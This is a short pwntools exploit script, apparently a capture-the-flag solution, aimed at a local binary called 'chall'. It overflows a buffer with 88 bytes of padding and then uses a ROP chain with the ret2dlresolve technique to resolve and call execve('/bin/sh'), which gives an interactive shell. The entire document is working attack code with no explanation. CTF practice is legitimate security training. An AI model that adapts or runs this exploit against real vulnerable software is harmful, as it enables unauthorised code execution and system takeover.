#ret2dlresolve

from pwn import *

p = process('chall')
elf = ELF('chall')
context.binary	= elf

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="execve", args=["/bin/sh",0,0])
rop.raw(b'a' * 88)
rop.gets(dlresolve.data_addr)
#print(hex(dlresolve.data_addr))
rop.ret2dlresolve(dlresolve)

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)

p.interactive()

